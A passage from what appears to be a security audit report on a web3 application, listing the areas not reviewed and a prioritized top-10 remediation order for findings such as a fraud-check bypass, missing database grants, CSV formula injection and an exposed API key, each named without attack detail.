- ~80 of 122 API routes (especially `support/*`, `analytics/*`, `quests`, `friends`, `groups/*`, `crypto/balance`, `crypto/transactions`, `crypto/rewards`, `streams/*`, `errors`, indexer subroutes)
- The entire frontend component tree (~1,090 components in `app/` + `components/`)
- Smaller contracts: `RevenueSplitter`, `LiquidityIncentives`, `GovernanceHooks`, `StablecoinRegistry`, `SeerSocial`, `SeerView`, `BadgeRegistry`, `BadgeQualificationRules`, `HeadhunterCompetitionPool` (assumed structurally identical to the other pools)
- The deployment scripts in `contracts/scripts/` for additional ordering / wiring concerns
- Most of 112 migrations (only RLS and role-grants migrations were spot-checked)

The marginal-finding rate was declining over the last two passes but had not hit zero. Plan to re-engage these areas in a follow-up cycle.

## Triage summary

If addressing in priority order, the suggested top-10 sequence:

1. **N-C4** — vault-fraud check fix (single-line; protects the entire fraud-escrow architecture)
2. **N-H17/N-H9** — MerchantPortal.processPayment fraud check (paired with N-C4)
3. **N-C1** — `vfide_app` DB grants (production blocker)
4. **N-H20** — JWT echoed in JSON (single-line; large XSS-defense uplift)
5. **N-C2** — VaultHub.executeRecoveryRotation challenge mechanism (custodial-recovery hole)
6. **N-H6/N-H10** — pending sensitive state cleanup on rotation (paired with N-C2)
7. **N-C3** — step-up auth via header (clear bypass)
8. **N-H7** — merchant payment-link DoS via arbitrary tx_hash
9. **N-H8** — CSV formula injection
10. **N-H21** — Etherscan API key client exposure

After these, the rest of the High-tier findings can be batched alongside the Medium tier in scheduled remediation sprints.
